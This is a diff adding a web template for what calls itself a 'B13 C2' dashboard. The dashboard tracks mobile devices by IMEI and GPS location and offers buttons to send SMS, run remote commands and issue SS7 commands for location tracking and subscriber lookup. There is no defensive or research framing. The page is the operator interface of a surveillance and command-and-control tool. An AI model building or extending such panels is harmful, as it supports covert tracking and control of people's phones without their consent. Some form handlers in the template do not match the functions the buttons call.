@@ -1,0 +1,524 @@
+{% extends "base.html" %}
+
+{% block title %}Mobile Traffic - B13 C2{% endblock %}
+
+{% block content %}
+<!-- Mobile Traffic Overview -->
+<div class="card fade-in">
+    <div class="card-header">
+        <h5 class="mb-0">Mobile Traffic Overview</h5>
+    </div>
+    <div class="card-body">
+        <div class="row">
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-number">{{ stats.total_sessions }}</div>
+                    <div class="stat-label">Total Sessions</div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-number">{{ stats.active_sessions }}</div>
+                    <div class="stat-label">Active Sessions</div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-number">{{ stats.total_packets }}</div>
+                    <div class="stat-label">Packets Captured</div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-number">{{ stats.total_devices }}</div>
+                    <div class="stat-label">Connected Devices</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Device Recognition -->
+<div class="card fade-in mt-4">
+    <div class="card-header">
+        <h5 class="mb-0">Device Recognition</h5>
+    </div>
+    <div class="card-body">
+        <div class="table-responsive">
+            <table class="table">
+                <thead>
+                    <tr>
+                        <th>Device ID</th>
+                        <th>Model</th>
+                        <th>OS</th>
+                        <th>IMEI</th>
+                        <th>Network</th>
+                        <th>Location</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for device in devices %}
+                    <tr>
+                        <td>{{ device.id }}</td>
+                        <td>{{ device.model }}</td>
+                        <td>{{ device.os }}</td>
+                        <td>{{ device.imei }}</td>
+                        <td>
+                            <span class="badge {% if device.network == '5G' %}bg-success{% elif device.network == '4G' %}bg-info{% elif device.network == '3G' %}bg-warning{% else %}bg-secondary{% endif %}">
+                                {{ device.network }}
+                            </span>
+                        </td>
+                        <td>
+                            <span class="text-muted">
+                                {{ device.location.lat }}, {{ device.location.lng }}
+                            </span>
+                        </td>
+                        <td>
+                            <button class="btn btn-sm btn-primary" onclick="viewDeviceDetails('{{ device.id }}')">
+                                <i class="fas fa-info-circle"></i> Details
+                            </button>
+                            <button class="btn btn-sm btn-info" onclick="sendSMS('{{ device.id }}')">
+                                <i class="fas fa-sms"></i> SMS
+                            </button>
+                            <button class="btn btn-sm btn-danger" onclick="disconnectDevice('{{ device.id }}')">
+                                <i class="fas fa-times"></i> Disconnect
+                            </button>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<!-- Traffic Visualization -->
+<div class="traffic-visualization fade-in">
+    <h3>Real-time Traffic Flow</h3>
+    <div class="traffic-grid">
+        {% for session in sessions %}
+        <div class="traffic-session">
+            <div class="session-header">
+                <span class="session-id">Session {{ session.id }}</span>
+                <span class="session-status {% if session.active %}active{% else %}inactive{% endif %}">
+                    {{ session.status }}
+                </span>
+            </div>
+            <div class="session-details">
+                <div class="traffic-bar">
+                    <div class="traffic-progress" style="width: {{ session.progress }}%"></div>
+                </div>
+                <div class="traffic-stats">
+                    <span class="stat">Packets: {{ session.packets }}</span>
+                    <span class="stat">Bytes: {{ session.bytes }}</span>
+                </div>
+            </div>
+        </div>
+        {% endfor %}
+    </div>
+</div>
+
+<!-- Mobile Device Management -->
+<div class="card fade-in">
+    <div class="card-header">
+        <h5 class="mb-0">Mobile Device Management</h5>
+    </div>
+    <div class="card-body">
+        <div class="table-responsive">
+            <table class="table">
+                <thead>
+                    <tr>
+                        <th>Device ID</th>
+                        <th>Network Status</th>
+                        <th>Location</th>
+                        <th>IMEI</th>
+                        <th>SS7/GSM Protocol</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for device in devices %}
+                    <tr>
+                        <td>
+                            <div class="device-info">
+                                <img src="{{ url_for('static', filename='assets/device_icons/' + device.model + '.png') }}" 
+                                     alt="{{ device.model }}" style="height: 30px; margin-right: 10px;">
+                                <span>{{ device.id }}</span>
+                            </div>
+                        </td>
+                        <td>
+                            <div class="network-status">
+                                <span class="badge {% if device.network == '5G' %}bg-success{% elif device.network == '4G' %}bg-info{% elif device.network == '3G' %}bg-warning{% else %}bg-secondary{% endif %}">
+                                    {{ device.network }}
+                                </span>
+                                <span class="text-muted">{{ device.signal_strength }}%</span>
+                            </div>
+                        </td>
+                        <td>
+                            <div class="location-info">
+                                <i class="fas fa-map-marker-alt"></i>
+                                <span>{{ device.location.city }}, {{ device.location.country }}</span>
+                            </div>
+                        </td>
+                        <td>{{ device.imei }}</td>
+                        <td>
+                            <div class="protocol-info">
+                                <span class="badge {% if device.gsm_protocol == 'VoLTE' %}bg-success{% elif device.gsm_protocol == 'VoNR' %}bg-info{% elif device.gsm_protocol == '4G' %}bg-warning{% else %}bg-secondary{% endif %}">
+                                    {{ device.gsm_protocol }}
+                                </span>
+                                <span class="text-muted">{{ device.ss7_status }}</span>
+                            </div>
+                        </td>
+                        <td>
+                            <div class="btn-group">
+                                <button class="btn btn-sm btn-primary" onclick="viewDeviceDetails('{{ device.id }}')">
+                                    <i class="fas fa-info-circle"></i> Details
+                                </button>
+                                <button class="btn btn-sm btn-info" onclick="sendSMS('{{ device.id }}')">
+                                    <i class="fas fa-sms"></i> SMS
+                                </button>
+                                <button class="btn btn-sm btn-success" onclick="sendCommand('{{ device.id }}')">
+                                    <i class="fas fa-terminal"></i> Command
+                                </button>
+                                <button class="btn btn-sm btn-warning" onclick="ss7Command('{{ device.id }}')">
+                                    <i class="fas fa-signal"></i> SS7
+                                </button>
+                                <button class="btn btn-sm btn-danger" onclick="disconnectDevice('{{ device.id }}')">
+                                    <i class="fas fa-times"></i> Disconnect
+                                </button>
+                            </div>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<!-- SS7 Command Modal -->
+<div class="modal fade" id="ss7Modal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">SS7 Command</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="ss7Form">
+                    <input type="hidden" id="targetDevice" name="targetDevice">
+                    <div class="mb-3">
+                        <label for="ss7Protocol" class="form-label">SS7 Protocol</label>
+                        <select class="form-select" id="ss7Protocol" name="ss7Protocol" required>
+                            <option value="MAP">MAP</option>
+                            <option value="SCCP">SCCP</option>
+                            <option value="TCAP">TCAP</option>
+                            <option value="ISUP">ISUP</option>
+                            <option value="MTP">MTP</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label for="ss7Command" class="form-label">Command Type</label>
+                        <select class="form-select" id="ss7Command" name="ss7Command" required>
+                            <option value="sms">SMS Control</option>
+                            <option value="call">Call Control</option>
+                            <option value="location">Location Tracking</option>
+                            <option value="subscriber">Subscriber Info</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label for="ss7Data" class="form-label">Command Data</label>
+                        <textarea class="form-control" id="ss7Data" name="ss7Data" rows="3" required></textarea>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-primary" onclick="sendSS7Command()">Send Command</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // SS7 Command Functions
+    function ss7Command(deviceId) {
+        document.getElementById('targetDevice').value = deviceId;
+        const modal = document.getElementById('ss7Modal');
+        modal.classList.add('show');
+        modal.style.display = 'block';
+    }
+
+    function sendSS7Command() {
+        const form = document.getElementById('ss7Form');
+        const formData = new FormData(form);
+        
+        fetch('{{ url_for('send_ss7_command') }}', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showToast('SS7 command sent successfully', 'success');
+            } else {
+                showToast('Failed to send SS7 command', 'error');
+            }
+        })
+        .catch(error => {
+            showToast('Error: ' + error, 'error');
+        });
+        
+        document.getElementById('ss7Modal').classList.remove('show');
+        document.getElementById('ss7Modal').style.display = 'none';
+    }
+</script>
+
+<!-- Device Details Modal -->
+<div class="modal fade" id="deviceDetailsModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Device Details</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div id="deviceDetailsContent">
+                    <!-- Device details will be populated dynamically -->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- SMS Modal -->
+<div class="modal fade" id="smsModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Send SMS</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="smsForm">
+                    <input type="hidden" id="targetDevice" name="targetDevice">
+                    <div class="mb-3">
+                        <label for="smsNumber" class="form-label">Recipient Number</label>
+                        <input type="tel" class="form-control" id="smsNumber" name="smsNumber" required>
+                    </div>
+                    <div class="mb-3">
+                        <label for="smsMessage" class="form-label">Message</label>
+                        <textarea class="form-control" id="smsMessage" name="smsMessage" rows="4" required></textarea>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Network</label>
+                        <select class="form-select" id="smsNetwork" name="smsNetwork" required>
+                            <option value="">Select Network</option>
+                            <option value="5G">5G</option>
+                            <option value="4G">4G</option>
+                            <option value="3G">3G</option>
+                        </select>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-primary" onclick="sendSMS()">Send SMS</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Command Modal -->
+<div class="modal fade" id="commandModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Send Command</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="commandForm">
+                    <input type="hidden" id="targetDevice" name="targetDevice">
+                    <div class="mb-3">
+                        <label for="commandType" class="form-label">Command Type</label>
+                        <select class="form-select" id="commandType" name="commandType" required>
+                            <option value="">Select Command Type</option>
+                            <option value="network">Network Control</option>
+                            <option value="location">Location Tracking</option>
+                            <option value="sms">SMS Management</option>
+                            <option value="data">Data Usage</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label for="commandInput" class="form-label">Command</label>
+                        <textarea class="form-control" id="commandInput" name="commandInput" rows="3" required></textarea>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-primary" onclick="sendCommand()">Send Command</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Packet Details Modal -->
+<div class="modal fade" id="packetModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Packet Details</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <pre id="packetContent"></pre>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Device Interaction Functions
+    function viewDeviceDetails(deviceId) {
+        fetch(`{{ url_for('get_device_details') }}/${deviceId}`)
+            .then(response => response.json())
+            .then(data => {
+                const content = document.getElementById('deviceDetailsContent');
+                content.innerHTML = `
+                    <div class="device-info">
+                        <h4>Device Information</h4>
+                        <div class="row">
+                            <div class="col-md-6">
+                                <p><strong>Device ID:</strong> ${data.id}</p>
+                                <p><strong>Model:</strong> ${data.model}</p>
+                                <p><strong>OS:</strong> ${data.os}</p>
+                                <p><strong>IMEI:</strong> ${data.imei}</p>
+                            </div>
+                            <div class="col-md-6">
+                                <p><strong>Network:</strong> ${data.network}</p>
+                                <p><strong>Signal:</strong> ${data.signal_strength}%</p>
+                                <p><strong>Location:</strong> ${data.location.city}, ${data.location.country}</p>
+                                <p><strong>Last Seen:</strong> ${data.last_seen}</p>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                const modal = document.getElementById('deviceDetailsModal');
+                modal.classList.add('show');
+                modal.style.display = 'block';
+            });
+    }
+
+    function sendSMS(deviceId) {
+        document.getElementById('targetDevice').value = deviceId;
+        const modal = document.getElementById('smsModal');
+        modal.classList.add('show');
+        modal.style.display = 'block';
+    }
+
+    function sendCommand(deviceId) {
+        document.getElementById('targetDevice').value = deviceId;
+        const modal = document.getElementById('commandModal');
+        modal.classList.add('show');
+        modal.style.display = 'block';
+    }
+
+    function disconnectDevice(deviceId) {
+        if (confirm('Are you sure you want to disconnect this device?')) {
+            fetch(`{{ url_for('disconnect_device') }}/${deviceId}`, {
+                method: 'DELETE'
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showToast('Device disconnected successfully', 'success');
+                    setTimeout(() => {
+                        window.location.reload();
+                    }, 1000);
+                } else {
+                    showToast('Failed to disconnect device', 'error');
+                }
+            });
+        }
+    }
+
+    // Form Submission Handlers
+    function submitSMS() {
+        const form = document.getElementById('smsForm');
+        const formData = new FormData(form);
+        
+        fetch('{{ url_for('send_sms') }}', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showToast('SMS sent successfully', 'success');
+            } else {
+                showToast('Failed to send SMS', 'error');
+            }
+        })
+        .catch(error => {
+            showToast('Error: ' + error, 'error');
+        });
+        
+        document.getElementById('smsModal').classList.remove('show');
+        document.getElementById('smsModal').style.display = 'none';
+    }
+
+    function submitCommand() {
+        const form = document.getElementById('commandForm');
+        const formData = new FormData(form);
+        
+        fetch('{{ url_for('send_command') }}', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showToast('Command sent successfully', 'success');
+            } else {
+                showToast('Failed to send command', 'error');
+            }
+        })
+        .catch(error => {
+            showToast('Error: ' + error, 'error');
+        });
+        
+        document.getElementById('commandModal').classList.remove('show');
+        document.getElementById('commandModal').style.display = 'none';
+    }
+
+    // Toast Notifications
+    function showToast(message, type) {
+        const toast = document.createElement('div');
+        toast.className = `toast fade show ${type}`;
+        toast.innerHTML = `
+            <div class="toast-header">
+                <strong class="me-auto">${type.charAt(0).toUpperCase() + type.slice(1)}</strong>
+                <button type="button" class="btn-close" data-bs-dismiss="toast"></button>
+            </div>
+            <div class="toast-body">${message}</div>
+        `;
+        
+        document.body.appendChild(toast);
+        setTimeout(() => {
+            toast.classList.remove('show');
+            setTimeout(() => {
+                toast.remove();
+            }, 150);
+        }, 3000);
+    }
+
+    // Auto-refresh device list every 30 seconds
+    setInterval(() => {
+        window.location.reload();
+    }, 30000);
+</script>
+{% endblock %}
